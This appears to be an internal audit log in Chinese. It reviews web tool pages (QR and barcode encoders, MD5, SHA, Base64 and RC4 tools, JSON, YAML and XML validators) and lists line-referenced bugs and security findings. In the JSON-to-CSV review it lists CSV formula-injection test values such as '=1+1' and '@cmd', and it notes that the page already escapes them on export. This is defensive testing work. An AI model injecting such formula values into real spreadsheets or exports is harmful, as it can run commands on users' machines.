- `tools/it/rust-cheatsheet.html`：条目筛选、分类统计正常；5 条示例用 `--` 注释、2 条用 `...` 占位，且部分片段缺少上下文，复制不可编译。
- `tools/it/screen-size.html`：PPI、物理宽高、长宽比与点距计算正确；公式框声明的「屏幕面积」从未计算输出。
- `tools/it/summary-generator.html`：分句、词频、长度/位置/关键词权重与压缩率均已实现；长文本下 5% 句频阈值可把关键词全部滤掉，导致权重全 0、摘要退化为前 N 句。
- `tools/it/svg-placeholder-generator.html`：宽高钳制、字号、SVG 转义、复制与下载可用；历史记录回填后调用的是 `downloadSvg()` 而非 `render()`，结果区不重算还会触发下载。
- `tools/it/team-name-generator.html`：词库随机组合真实可用、输出经 `escapeHtml`；页面只有「领域」与「数量」，meta/公式/FAQ 承诺的风格、长度、数字后缀与语言切换均无对应控件。

| 页面 | 问题（含 tools/it/<slug>.html:NN） | 编号 |
|---|---|---|

**统计**
- 页数：8（`password-strength`、`python-cheatsheet`、`redis-cheatsheet`、`rust-cheatsheet`、`screen-size`、`summary-generator`、`svg-placeholder-generator`、`team-name-generator`）。
- 问题：14 条——高 1（IT-N536）/ 中 13（IT-N537–IT-N549）。
- 编号区间：IT-N536–IT-N549，连续且无重号、无跳号（与已转修复清单无重叠）。
- 假工具：0 个（无整页伪工具；IT-N545、IT-N549 为承诺未实现，已计入中）。
- 安全条目：0 条——8 页均未出现 `eval`/`new Function`/`allow-same-origin`/明文存密/第三方外传；`password-strength.html:542` 的 localStorage 持久化选择器显式排除 `input[type=password]`，密码未落盘；其余用户输入均经 `escapeHtml`/`escH` 或仅写入 `textContent`/`value`，未发现可控 DOM 注入点。
- 方法：逐页通读 HTML 与全部内联 JS；node 复刻 `password-strength` 的熵/破解时间换算（确认标签倍率偏差）与 `summary-generator` 的 5% 句频过滤（60 句唯一文本过滤后 0 关键词、60 句权重全 0）；未开浏览器、未跑 `_build.py`/`run_gates.py`、未执行 git、未修改任何 `tools/**` 或构建产物。

## Z 批 · IT 编码/速查（二）（2026-11-04）

逐页结论（5 页）：

- `tools/it/text-qr.html`：2 条（IT-N550 高、IT-N551 中）。页面能画出定位图形，但数据区是伪随机噪声，text 只当种子，不是二维码编码；承诺的尺寸/容错/配色与 PNG/SVG 下载均无控件。
- `tools/it/tmux-cheatsheet.html`：2 条（IT-N552、IT-N553 中）。39 条速查与搜索/分类/图表均可用；问题在示例与参数说明的可复制性。
- `tools/it/unicode-lookup.html`：3 条（IT-N554–IT-N556 中）。逐字符码点浏览、UTF-8/UTF-16 换算与区段遍历正确；码点/名称检索未实现、名称字段写死、特定字符的复制按钮失效。
- `tools/it/username-generator.html`：1 条（IT-N557 中）。词根随机组合、数字/下划线/Leet/前缀与长度截断可运行，输出经 `escapeHtml`；「风格」承诺无对应控件。
- `tools/it/xxtea.html`：2 条（IT-N558 高、IT-N559 中）。加解密算法本体正确（node 复刻 1–255 字节逐长度往返一致）；缺陷在长度字只取低 8 位导致长文本解密截断，以及超长密钥静默丢弃。

| 页面 | 问题（tools/it/<slug>.html:NN） | 编号 |
|---|---|---|

**统计**
- 页数：5（`text-qr`、`tmux-cheatsheet`、`unicode-lookup`、`username-generator`、`xxtea`）。
- 问题：10 条——高 2（IT-N550、IT-N558）/ 中 8（IT-N551–IT-N557、IT-N559）。
- 编号区间：IT-N550–IT-N559，连续且无重号、无跳号（与上批 IT-N536–IT-N549 衔接）。
- 假工具：0 个（无整页空壳；text-qr 有真实 UI 与历史模板，但核心渲染为伪生成，已计高）。
- 安全条目：0 条——本批页面未出现 `eval`/`new Function`/`allow-same-origin`/明文存密/可控 DOM 注入点（`text-qr` 的文本经 `escapeHtml`，`tmux` 全字段经 `escapeHtml`，`unicode-lookup` 注入的 name 取自硬编码表）；`xxtea` 密钥与明文仅存内存，未落 localStorage。全站公共模板的 `ttzz`（bytegoofy）第三方脚本非本批页面特有，未计入。
- 方法：逐页通读 HTML 与全部内联 JS；`node -e` 内存复刻 `xxtea` 的 `longToBytes`/`bytesToLong`/加解密（未落盘、未建文件），逐长度核对往返与密钥前缀碰撞；`text-qr` 伪编码按源码判定（无分段/纠错/格式信息/掩码）；未开浏览器、未跑 `_build.py`/`run_gates.py`、未执行 git、未修改任何 `tools/**` 或构建产物。

## AA 批 · IT 深度复扫：QR/条码同族实现矩阵（2026-11-04）

> 范围：`tools/it/` 下 10 页（QR 族 5 + 一维条码族 5）。只读源码 + `node -e` 内存复算（比对 EAN G 表、Code39 元素数、Code128 符号表、`unescape` 行为），未开浏览器、未跑 `_build.py`/`run_gates.py`、未执行 git、未修改 `tools/**`/js/css/json 或构建产物。伪实现 3 页沿用既有编号（IT-N520/N521/N550），本批不重复开单；新问题从 IT-D01 起。

### 同族实现矩阵

| 页面 | 真实编码 | 伪实现 | 校验位 | 纠错 | 可扫码 | 结论 / 编号 |
|---|---|---|---|---|---|---|
| `tools/it/qrcode.html` | 是（模式分段+RS+掩码+格式信息，复用 `js/qrcode.js`） | 否 | 是（格式信息 BCH + RS 码字） | 是（L/M/Q/H Reed-Solomon） | 是 | **唯一真 QR 编码页**；`:428-435` 调库；表 L 列 v9/v10 错（IT-D02）、默认 Byte 模式（IT-D03）、容量图超限仍标 10（IT-N260） |
| `tools/it/text-qr.html` | 否 | 是 | 无 | 无 | 否 | `:247-267` 固定 29×29，`text` 只作随机种子（IT-N550 高） |
| `tools/it/qr-decoder.html` | 不适用（不做图像解码） | 否 | 不适用 | 不适用 | 不适用 | `:266-345` 是按前缀解析文本的真实逻辑，不是二维码解码器；`:149`/`:152` 英文与公式误称「图像/摄像头解码」（IT-D06） |
| `tools/it/barcode-code128.html` | 是（107 符号+Start A/B/C+13 模块 Stop） | 否 | 是（加权 mod 103） | 无（一维码规范无纠错） | 是（静区偏窄） | 唯一直接复用 `js/barcode-lib.js:22-98` 的 1D 页；静区单位错位（IT-D08） |
| `tools/it/barcode-ean.html` | 部分（95 模块、保护线/奇偶表齐全） | 否 | 是（mod 10，`:250-253`） | 无 | 否（首位≠0） | `:246` G 表由 L 表反转，实为标准 G 的反码；`:273` 用于左侧 → 默认码奇偶校验失败（IT-D01 高） |
| `tools/it/barcode-upc.html` | 是（95 模块 L/R、保护线） | 否 | 是（mod 10；12 位输入不校验，IT-N128） | 无 | 是（静区仅 3.3 模块） | `:252-262` 编码结构正确；补零/截断（IT-N127）、首位未印左静区（IT-N129）仍在 |

**核心差异**：QR 族 5 页里**只有 `qrcode.html` 一页做了真实现**——`email-qr`/`location-qr`/`text-qr` 三页全是「定位符 + 伪随机点阵」，`qr-decoder` 只是文本前缀解析器。一维族 5 页里**只有 `code128` 直接复用共享库**；`upc` 手写但结构正确，`ean` 手写且 G 表反相（默认不可扫），`code39`/`msi` 手写且不符合规范。
**重写线**：`email-qr`、`location-qr`、`text-qr` 改用 `js/qrcode.js`（按 byte/UTF-8 写入并保留 4 模块静区）。
**修复线**：`barcode-ean` → `B.encode('ean13')`；`barcode-code39` → `B.encode('code39')`；`barcode-msi` 重写位宽并补校验位；`qr-decoder` 要么补图像解码，要么删除 `:149`/`:152-157` 的图像解码宣称。

### 逐页结论

- `qrcode.html`：真编码。除 IT-N260（超 V10 一律标 10）外，本批新增两处：数字容量表 L 列 v9/v10 取值错（IT-D02），以及未指定编码模式导致纯数字也走 Byte（IT-D03）。IT-N258 的 UTF-8 问题已由 `:430-432` 修复（`stringToBytes` 已切 UTF-8），可销案。
- `text-qr.html`：假二维码；版本固定 29，`text` 只影响噪点种子（IT-N550）。
- `qr-decoder.html`：前缀解析逻辑真实（WIFI/mailto/tel/sms/geo/http/vCard/VEVENT），但不是图像解码器；WiFi 百分号解码用 `unescape`（IT-D04）、不识别 `SMSTO:`（IT-D05）、英文/公式误称图像解码（IT-D06）、NaN 守卫误吞结果（IT-D07）。
- `barcode-code128.html`：编码表/校验/Stop 均正确，是 1D 族唯一可直接信任的页；问题是静区按像素计（IT-D08）与既有的空输入回退空格（IT-N125）。
- `barcode-ean.html`：长度与校验位校验已补齐（IT-N73/N84 的旧证据已失效，勿按旧结论返工），但 G 表反相使默认 `6901234567892` 与所有首位 1–9 的码不可扫（IT-D01）。共享库 `js/barcode-lib.js:103-104` 的 EAN_G 是正确的，本页却未加载该库。
- `barcode-upc.html`：L/R 与保护线正确，默认 `03600029145` 自动补校验位 `2`，结构合法；12 位输入不比对第 12 位（IT-N128）、空/短输入补零（IT-N127）、首位未单印左静区（IT-N129）仍在。

### 三角度抽查

- **默认值**：EAN 默认 `690123456789` → 校验位 2、首位 6（奇偶 `LGGGLL`），左侧 3 位走错误 G 表 → 默认输出即不可扫（IT-D01）。UPC 默认 `03600029145` → `036000291452` 校验位正确。Code128 默认 `ABC-1234` 合法。Code39 默认 `CODE-39` 字符合法但 15 元素表使图不可扫。MSI 默认 `1234567` 无校验（页面标为可选）。
- **倍率/单位**：Code39 固定 3:1（规范 2:1–3:1，合规）；MSI `1` 编成 3 模块宽条（与公式「宽条窄空」不符）；条码模块宽 2–3 px 合理；QR 真页按 `pixelSize/moduleCount` 取整（`:439-465`），伪页固定 8 px/格。静区问题见 IT-D08。
- **表维度**：`QR_NUM_CAP` 仅 L 列 v9/v10 两格错（M/Q/H 与字节容量列逐项对 ISO 表正确）；EAN `PARITY` 表、UPC `L/R` 表、MSI 数字 4 bit 表维度均正确，错的是 EAN 的 G 表内容与 Code39 的 15 元素表结构。

### 问题表格

| 页面 | 问题（tools/it/<slug>.html:NN） | 编号 |
|---|---|---|
| `tools/it/barcode-ean.html` | G 码表由 L 表逐位反转（`:246`），得到的是标准 G 的反码；`:273` 将其用于左侧第 2–7 位。默认 `6901234567892` 首位 6 → 奇偶 `LGGGLL`，第 3–5 位走错误 G，扫码器无法通过奇偶校验；只有首位 0（`LLLLLL`）不受影响。共享库 `js/barcode-lib.js:103-104` 的 EAN_G 正确，但本页未加载（`tools/it/` 下仅 `barcode-code128.html:28` 引 barcode-lib；另两处为 `tools/biz/barcode-generator.html` 与 `tools/science/barcode-pharmacode.html`）。 | IT-D01 |
| `tools/it/qrcode.html` | `QR_NUM_CAP.L` 第 9/10 项写成 511/604（`:530`），ISO/IEC 18004 数字模式 L 应为 552/652（v9 数据码字 232、v10 274）；同表 M/Q/H 与 L/M/Q/H 字节列逐项正确，仅 L 列这两格错位，容量速查表给错数。 | IT-D02 |
| `tools/it/qrcode.html` | `qr.addData(text)` 未传 mode（`:434`），`js/qrcode.js:388` 默认 `Byte`；公式 `:196` 却称「自动选最短」。20 位纯数字按 Byte 需 V2-L（32 字节），按数字模式 V1-L（41 位）即可；大写字母数字同理，版本/模块数被不必要抬高。 | IT-D03 |
| `tools/it/qr-decoder.html` | `wifiValue`（`:265`）用 `unescape` 解百分号：`unescape('%E4%B8%AD')` 得 `ä¸­`（Latin-1 逐字节），不是 UTF-8 的「中」；中文 SSID/密码显示乱码，用户照抄连不上。应改 `decodeURIComponent`。 | IT-D04 |
| `tools/it/qr-decoder.html` | 只匹配 `^sms:`（`:285`），而本站 `qrcode.html:217` 预设与 `sms-qr.html:156` 均输出 `SMSTO:号码:内容`；自家生成的短信二维码粘回来被判为「纯文本」，号码/正文都不提取。 | IT-D05 |
| `tools/it/qr-decoder.html` | `:149` 英文与 `:152` 公式写「Decode QR codes from an image or camera」「从图片中识别并解码二维码」，`:154-157` 还列出定位/采样/RS 纠错；实际控件只有文本框（`:163`），`decode()` `:266-345` 仅按前缀解析，无文件/相机/图像处理，英文态按说明使用必然扑空。 | IT-D06 |
| `tools/it/qr-decoder.html` | `:342` 的模板 NaN 守卫扫描 `decode()` 返回的、已拼入用户值的 HTML；正文/URL 含独立 `NaN` 或 `Infinity`（如 `mailto:...&body=NaN`、`WIFI:S:NaN;...`）即被替换成「⚠ 计算结果含无效值，请检查输入是否为有效正数」，解析结果整块消失。与 IT-N232 同型；`email-qr.html:293`、`text-qr.html:280` 同样中招。 | IT-D07 |
| `tools/it/barcode-code128.html` | 静区单位错位：`:272` 传 `quiet:10`，`js/barcode-lib.js:343` 定义了却从未使用的 `quietModules()`，`:349-351` 把 `quiet` 当像素加在 `bits.length*scale` 两侧；`scale=2` 时仅 5 模块，低于 Code 128 规范 10 模块。同型：EAN/UPC 页 10px≈3.3 模块（规范 9–11），打印/贴标时四周留白不足；SVG 路径同样按 `q*2` 处理。 | IT-D08 |

**统计**
- 页数：10（QR 族 5 + 条码族 5）。
- 新增问题：8 条——高 1（IT-D01）/ 中 7（IT-D02–IT-D08）；编号区间 IT-D01–IT-D08，连续、无重号，与既有 IT-N 系列不混号。
- 复核既有：伪实现 3 页（IT-N520/N521/N550，高）；Code39 IT-N507–IT-N509；MSI IT-N510–IT-N512；UPC IT-N127–IT-N129；Code128 IT-N125；qrcode IT-N260。另确认 IT-N258 已由 `:430-432` 修复（UTF-8 编码），IT-N73/N84 已由 `:255-268` 修复（长度/校验位校验），三处可销案。
- 假工具：3 个（`email-qr`、`location-qr`、`text-qr`），均沿用既有高优编号，不重复计数。
- 安全条目：0 条——10 页无 `eval`/`new Function`/`allow-same-origin`/明文存密/第三方外传；用户文本均经 `escapeHtml`（`qr-decoder.html:249`、`email-qr.html:293`、`text-qr.html:280`、`barcode-msi.html:286`、`barcode-code39.html:323`），仅存主题/表单偏好于 localStorage（无敏感值）。`qrcode.html:473` 把 `e.message` 直接写入 innerHTML，但库异常文案为静态常量，不可控，未计入。
- 方法：逐页通读 HTML 与全部内联 JS；`node -e` 验证 EAN G 表为标准 G 的反码（`reverse(L)` vs `EAN_G`）、Code39 `0` 为 15 元素/25 模块（标准 9/15）、`unescape('%E4%B8%AD')` 为 `ä¸­`、Code128 表 107 项且 Stop 13 模块；未开浏览器、未跑构建/门禁、未执行 git、未修改任何 `tools/**` 或构建产物。

## AB 批 · IT 族矩阵：哈希/加密/编码（2026-11-04）

> 页面名后的「（死键 N）」= 该页第三层英文词典（`i18n/tools/en/<ind>/<slug>.json`）高优先死键数（来源 `plan/i18n-dead-keys.md`）；各线改本页时顺手清理，本批不修英文。

本轮只读复扫 `tools/it/` 下 md5/sha/base64/base32/hex/rc4 6 页，覆盖摘要、编码、流密码三个子类。默认态：md5/sha/base64/hex/base32 五页加载即自动计算，逐一对标准工具复算均正确；rc4 不自动运行，无默认输出。

### 矩阵

| 页面 | 实现方式（共享库/自写/伪/回显） | 可验证性（标准工具复算） | 结论 |
|---|---|---|---|
| `md5.html`（死键 5） | 自写 MD5（charCode 分块；文件走 FileReader 整包） | ✅ 全部一致：`node:crypto` 复算默认 `Hello, MD5!`=`383e139e64e5f46de9d03ba3695da2d8`、`abc`=`900150983cd24fb0d6963f7d28e17f72`、空串=`d41d8cd98f00b204e9800998ecf8427e`；页面 `hmacMd5('mysecret','Hello, HMAC-MD5!')`=`f8d020bdc5de08ea93f68ad045c6d01c`，80 字节长密钥亦与 `createHmac` 一致 | 算法正确，默认文本/HMAC 输出正确；仅「任意大小文件」承诺未兑现（②） |
| `sha.html`（死键 0） | 共享原生 `crypto.subtle.digest` | ✅ 一致：SHA-256(`Hello, SHA!`)=`be54d2492206f27aed3e7f822d24bd5f4f477177b712bed37c762bbad3bd2d25`，`abc`=`ba7816…0015ad`（node） | 计算正确；但承诺的 SHA-224 与「分块计算」均未实现（②） |
| `base64-converter.html`（死键 0） | 自写 Base64（TextEncoder+btoa）、Base32、Base85 | ✅ 一致：默认 `Hello, World! 你好，世界！`→`SGVsbG8sIFdvcmxkISDkvaDlpb3vvIzkuJbnlYzvvIE=`；Base32 `Hello`→`JBSWY3DP`；Base85 去掉 `<~ ~>` 包裹后与 Python `a85encode` 逐字节一致（`Hi`→`88/`，`中文`→`jLD>SQA5`），标准解码器可互通 | 三种编码正确，默认自动编码结果正确 |
| `hex-encode.html`（死键 0） | 自写 TextEncoder + `toString(16)` | ✅ 一致：默认 `Hi`→`0x4869`；`中文`→`e4b8ade69687`（node） | 编码与默认输出正确；解码不接受逐字节 0x 前缀 |
| `rc4.html`（死键 0） | 自写 RC4 KSA/PRGA + drop | ✅ 一致：独立参考实现比对 `mysecretkey`、`secret123`、`anotherkey`、`rc4test`，drop 0/768/2048、中文与空串共 7 例全等 | 算法正确；页面不自动运行；解密输入判定有实质缺陷 |
| `base32-encode.html`（死键 0） | 自写 5 位位流编码 | ✅ 一致：`Hello`→`JBSWY3DP`、`f`→`MY======`、`中文`→`4S4K3ZUWQ4======`（RFC 4648 参考实现） | 编码与默认输出正确；解码静默接受非法长度 |

### 逐页结论

- `md5.html`：MD5 主循环与 HMAC（含 >64 字节密钥取原始摘要）均与 node 一致，`md5Bytes` 走字节数组亦正确；唯一问题是文件模式把整份文件读入 `ArrayBuffer`（`:439-448`）却宣称「支持任意大小文件」（`:202`），大文件存在内存失败风险。
- `sha.html`：真正调用 WebCrypto，SHA-256 默认结果与 node 一致，无伪实现；但 SEO 正文/SoftwareApplication JSON-LD 与算法说明均宣称 SHA-224（`:54,172,481`）而选择器只有 SHA-1/256/384/512（`:189-192`），文件区宣称「分块计算」（`:224`）实际是 `file.arrayBuffer()` 整包读取（`:369`）。
- `base64-converter.html`：Base64/Base32/Base85 三套编解码均正确，Base32 解码还带剩余位非零校验；Base85 末组用 0 填充（与 Python `a85encode` 相同，非 Adobe 的 `u` 填充），两种解码器均可正确还原。`autoDetect` 勾选实际只在解码时剥离 `data:` 前缀（`:682-684`），并无「输入类型自动检测」。
- `hex-encode.html`：UTF-8→字节→两位 hex 正确，默认 `0x4869` 正确；`dec()` 只剥离行首一个 `0x`（`:290`），粘贴常见 `0x41 0x42` 会被判非法字符而非解码。
- `rc4.html`：KSA/PRGA 与 drop-N 实现与独立参考逐字节一致；但解密用 `/^[0-9a-fA-F\s]+$/` 先判 Hex（`:383-387`），把恰为纯十六进制字符的 Base64 密文误当 Hex——实测明文 `328`、默认密钥加密得 Base64 `2eFA`，再解密输出乱码而非 `328`。另 `TextDecoder(..., {fatal:false})` 永不抛错，`:401-403` 的 Hex 回退是死代码，错误密钥/二进制密文只显示 U+FFFD 替换字符。
- `base32-encode.html`：编码位流正确，默认 `Hello`→`JBSWY3DP`；`base32ToBytes`（`:271-285`）既不校验末组剩余位，也不校验长度，`JB`→`H`、`JBSWY3D`→`Hell` 均静默返回截断结果（同站 `base64-converter.html:481-482` 的 Base32 解码反而有该校验）。

### 问题表格

| 页面 | 问题（tools/it/<slug>.html:NN） | 编号 |
|---|---|---|
| `tools/it/base32-encode.html` | 解码缺剩余位/长度校验（`:271-285`）：`JB`→`H`（剩 2 位被丢）、`JBSWY3D`→`Hell`（剩 3 位被丢），非法或截断输入静默产出错值，不报错。 | IT-D09 |
| `tools/it/rc4.html` | 解密先按 Hex 判定（`:383-387`）：全 hex 字符的 Base64 密文被误解析；实测明文 `328`、key `mysecretkey` 加密得 `2eFA`，解密时被当作 hex 字节 `2E FA` 处理，输出乱码而非 `328`，加解密往返不闭合。 | IT-D10 |
| `tools/it/rc4.html` | `TextDecoder('utf-8',{fatal:false})`（`:399-403`）不会抛异常，`catch` 的 `bytesToHex` 回退为死代码；错误密钥或二进制密文输出 U+FFFD 替换串，用户无法得到原始 hex。 | IT-D11 |
| `tools/it/hex-encode.html` | 解码仅 `replace(/^0x/i,'')` 一次（`:290`），而说明称「自动忽略 0x 前缀」（`:190`）；`0x41 0x42` 清洗后成 `410x42` 被判非法字符，常见逐字节 0x 格式不可用。 | IT-D12 |
| `tools/it/sha.html` | 承诺 SHA-224 但未提供：正文与 JSON-LD 列 SHA1/SHA224/SHA256/SHA384/SHA512（`:54,172,481`），算法选择器仅 4 项、无 SHA-224（`:189-192`）。 | IT-D13 |
| `tools/it/sha.html` | 文件区称「支持大文件，分块计算」（`:224`），实现为 `await file.arrayBuffer()` 整包读取（`:369`），并未分块流式处理。 | IT-D14 |
| `tools/it/md5.html` | 文件区称「支持任意大小文件」（`:202`），实现 `reader.readAsArrayBuffer(file)` 一次性读入内存（`:439-448`），超大文件易失败且无分块。 | IT-D15 |
| `tools/it/base64-converter.html` | 「自动检测输入类型」勾选框（`:208`）实际只在解码时剥离 data URI 前缀（`:682-684`），不判断编码/解码方向，也不识别 Base32/85，标签超出实现。 | IT-D16 |
| `tools/it/rc4.html` | 安全（明文存密）：TBKit 历史把 `key`、`input`、密文一并写入 localStorage（快照 `:452-462`、`record` `:537-541`）；`md5.html` 的 `hmacKey` 同型（`:477-482,561-563`），密钥长期明文留存。 | IT-D17 |
| `tools/it/base64-converter.html` | 安全（明文留存）：加载即 `encodeText()`（`:968-970`）并 `addHistory`（`:601-614`），未操作也会把输入/输出前 200 字写入 localStorage；粘贴令牌/密钥会被持久化，界面无提示。 | IT-D18 |

**统计**

- 页数：6（摘要 2 + 编码 3 + 流密码 1）；默认自动计算 5 页，rc4 无默认输出。
- 新增问题：10 条——① 高优 4（IT-D09–IT-D12）/ ② 假工具增量 4（IT-D13–IT-D16）/ ③ 安全 2（IT-D17–IT-D18）；编号 IT-D09–IT-D18 连续、无重号，接续上批 IT-D08。
- 复核既有：未发现本族 6 页存在伪实现或回显页；md5/sha 摘要与 rc4 密码学核心均经独立实现复算一致，`base64` 页 Base32/Base85 亦经 RFC 4648 / Python `a85` 交叉验证。
- 安全：无 `eval`/`new Function`/`allow-same-origin`/可控 DOM 注入；用户文本均走 `textContent`、`escHtml` 或定长 hex 输出。模板级 `lf1-cdn-tos.bytegoofy.com/ttzz` 第三方脚本在本批 6 页均存在（如 `md5.html:122`、`rc4.html:114`），属全站通用问题，已在既有审计（本文件 `:2180`）登记，不重复计数。
- 方法：`node:crypto` 复算 MD5/SHA-256/HMAC；`vm` 提取 `md5.html` 原脚本执行（含 UTF-8、中文、长密钥）；自写独立 RC4 参考与页面实现逐字节比对（含 drop 768/2048）；Python `base64.a85encode` 校验 Base85 末组填充；未开浏览器、未跑 `_build.py`/门禁、未执行 git、未修改 `tools/**`、js/css/json 或构建产物。

## AB 批 · IT 族矩阵：文本/数据格式（2026-11-04）
> 页面名后的「（死键 N）」= 该页第三层英文词典（`i18n/tools/en/<ind>/<slug>.json`）高优先死键数（来源 `plan/i18n-dead-keys.md`）；各线改本页时顺手清理，本批不修英文。

本轮只读复扫 `tools/it/` 下 `json-formatter` / `yaml-validator` / `xml-validator` / `json-to-csv` / `text-diff` / `markdown-lint` 共 6 页，覆盖 JSON 格式化压缩、YAML、XML、CSV↔JSON、文本 diff、Markdown lint（避开已转修复的 json-path / rich-text-editor / code-runner）。默认态：5 页加载即自动出结果（`json-formatter:727` loadSample、`yaml-validator:733-738` 初始化即 validateNow、`xml-validator:281` calcTool、`json-to-csv:410` Boot 内 toCSV、`markdown-lint:241` calcTool），`text-diff` 无默认输出（`:666` 提示先点「开始对比」）。默认结果抽验：json 样例合法并渲染树/统计；YAML `SAMPLE_YAML` 验证通过；XML 默认 4 元素、根 `note` 通过；CSV 默认 2 行×3 列；Markdown 默认 2 条（缺空格列表 + 空链接）。

### 矩阵

| 页面 | 实现方式（自写解析/库/正则伪解析/回显） | 可验证性（注释/根元素/CDATA/转义/深层嵌套是否保真） | 结论 |
|---|---|---|---|
| `json-formatter.html`（死键 4） | 原生 `JSON.parse` / `JSON.stringify` + 自写递归树渲染；无第三方库 | 美化/压缩/排序/反转义结构往返等价（`{"a":1,"b":"x\"y"}`、3 层嵌套、中文与 ASCII 均等）；缩进 2/4/Tab/0 生效；「转义」对合法 JSON 与「压缩」输出逐字节相同，不生成转义串；「提取」对同段两个对象只返回第一个 | 解析真实、无伪实现；转义名不符实、提取不完整（②） |
| `yaml-validator.html`（死键 0） | `js-yaml@4.1.0`（jsdelivr CDN，SRI 锁版）`loadAll` | ✅ 多键嵌套、多文档 `---`、锚点/合并键 `<<`、literal/folded 多行块标量、Tab 缩进报错、重复键报错位置准确；⚠ 非字符串键 `2024-01-01:` 被序列化成**本地时区 Date 字符串**作 JSON 键（随 TZ 漂移），`!!binary` 输出 `{"0":104,…}` 索引对象；循环锚点被 `stringify` 捕获并提示 | 解析真实；YAML→JSON 键名/类型失真（①）；CDN 依赖弱网误报见备注 |
| `xml-validator.html`（死键 0） | 浏览器原生 `DOMParser('application/xml')` | ✅ CDATA、实体转义、200 层嵌套、注释内 `<`、中文标签、重复属性、未闭合标签、未声明命名空间前缀判定均正确；`<!DOCTYPE … SYSTEM>` 实体引用报 `undefined entity`（不取外部实体，XXE 安全）；默认样例根 `note`、4 元素通过；⚠ 合法根元素 `<parsererror>` 被判「格式错误」 | 原生解析无伪；`parsererror` 检测误判（①） |
| `json-to-csv.html`（死键 0） | 原生 `JSON.parse` + 自写 RFC 4180 引号转义 | ✅ `A, B`、`say "hi"`、单元格内换行、嵌套对象串、null/缺失键经 Python `csv` 回读为 4 行×4 列，值逐格一致；⚠ `=1+1`、`@cmd` 原样输出但导出安全路径已加单引号转义 | 序列化正确、无丢列；CSV 公式注入已由 `cellExport` 缓解（③）；IT-N6/N7 已修复（见逐页结论） |
| `text-diff.html`（死键 0） | 自写 LCS（DP 表）+ 递归回溯；字符级按 `Array.from` 码点切分 | ✅ 2000 行/2 行内差异编辑脚本可精确重建两文本（same+remove=旧、same+add=新）；⚠ 4000 行全不同文本、单行 5000 字符均抛 `RangeError: Maximum call stack size exceeded`，`doDiff` 无 try/catch 兜底 | 算法正确但规模即崩（①）；忽略空白/大小写仅作用于比较、显示保留原文，正确 |
| `markdown-lint.html`（死键 0） | 纯行正则伪解析（无 CommonMark/remark 解析器） | ✅ 默认样例命中 2 条；⚠ `---` 前置元数据、行首 `*斜体*` 被误报「列表符号后缺空格」；`#标题`（井号后无空格）、行尾空格、未闭合代码块、嵌套列表缩进 MD007 均无检出 | 宣称的 3 项检查未实现 + 误报/漏报（②）；另有 `:120` 畸形 `</div` 备注 |

### 逐页结论

- 原记录待处理部分（未复核）：`json-to-csv.html` 历史回填仍直接调用 `downloadCSV()`。
- 留存建议（aes-encryptor）：①历史点击应回填参数并重算（原记录称当前只复制）；②增加密文/明文文件下载与原文件名还原；③内置 FIPS-197 官方向量一键自检。
- 留存建议（rsa）：①提供生成密钥后一键跑通加密/解密/签名/验签的演示流程；②显示密钥指纹与位数，支持粘贴 PEM 自动识别 PKCS#1/PKCS#8；③提供与 OpenSSL 命令互操作的说明与示例。

- `json-formatter.html`：JSON 解析与格式化真实，`sortKeys` 递归按键排序且数组元素同步排序，`renderTree` 对键/值一律 `escapeHtml`，无注入面。但「转义」按钮（`:612-623`）对合法 JSON 走 `JSON.parse`→`JSON.stringify(obj)`，与「压缩」（`:561-571`）输出完全相同，只有输入不是 JSON 时才 `JSON.stringify(string)`；「反转义」期望的是 JSON 字符串字面量，因此「转义→反转义」对合法 JSON 只相当于压缩再美化，按钮语义不成立。「提取」（`:640-678`）用贪婪 `{[\s\S]*}` 从首个 `{` 取到全文最后一个 `}` 后自尾截断，日志中多个 JSON 片段只能拿到第一个，与「从日志/代码片段自动提取」的说明不符。默认态 `loadSample()`（`:727`）即渲染 2 空格美化树、类型统计与柱状图，结果正确。
- `yaml-validator.html`：核心是 js-yaml 4.1.0 `loadAll`（`:479,698`），多文档、锚点、合并键、多行块、Tab/重复键报错（含行列与上下文）均与库行为一致，2 MB 上限（`:511`）有保护，循环引用被 `stringify` 的 catch 兜住（`:574-581`）。缺陷集中在「YAML→JSON 保真」：js-yaml 会把 `2024-01-01` 解析为 `Date`，作为 mapping 键时经 JS 键强制转换成本地时区 `Date.toString()` 串（实测 `Mon Jan 01 2024 08:00:00 GMT+0800 (中国标准时间)`），换时区/语言环境键名就变；`!!binary` 为 `Uint8Array`，`JSON.stringify` 得 `{"0":104,…}` 索引对象而非 base64；正文称「遵循 YAML 1.1/1.2 规范」（`:191`），实际 js-yaml 4 为 1.2 语义（`yes/on` 输出字符串，实测），1.1 用户预期落空。备注：js-yaml 走 CDN，弱网/离线时 `ReferenceError` 被 catch 后显示成「YAML 语法验证失败：jsyaml is not defined」，与既有 G09/IT-N2 外部依赖问题同型，不另编号。
- `xml-validator.html`：直接把输入交给原生 `DOMParser`（`:266`），只以 `getElementsByTagName('parsererror')` 数量判成败（`:267-271`），再取 `documentElement.tagName` 与元素总数（`:273-275`），不输出 DOM/文本，故无往返保真问题，也不会丢数据。CDATA/转义/200 层嵌套/重复属性/未闭合标签/未声明前缀/中文标签均判定正确；`DOCTYPE SYSTEM` 的外部实体不解析（报 undefined entity），XXE 面安全。唯一实质缺陷是 `<parsererror>` 判定按限定名跨命名空间匹配：合法文档根就叫 `<parsererror>` 时会被当成解析失败（jsdom 复算为 ❌、detail 输出正文 `valid`），Chrome/Firefox 同一 DOM 接口同样命中（浏览器未实测）。默认样例（`:119`）结构正常，`calcTool()`（`:281`）加载即输出 ✅ 根 `note`、4 元素。
- `text-diff.html`：LCS DP 与回溯实现真实，行级差异再合并 remove+add 为 modify，字符级用码点切分（emoji 不拆半），全部输出走 `ToolBox.escHtml`，统计口径（modify 计 1 增 1 删、总数去重）正确；默认无自动对比。致命点是 `backtrack` 为纯递归（`:441-457`），且未做规模限制或 try/catch：实测 4000 行全不同文本、单行 5000 字符均 `RangeError`，同时 `lcsLength` 的 `m×n` 二维数组在 4000×4000 时内存压力也很大；用户对两个较大文件点「开始对比」会无结果/脚本中断。历史记录只存前 1000 字符（`:698-704`）且提供清除按钮，按既有口径不另计安全项。
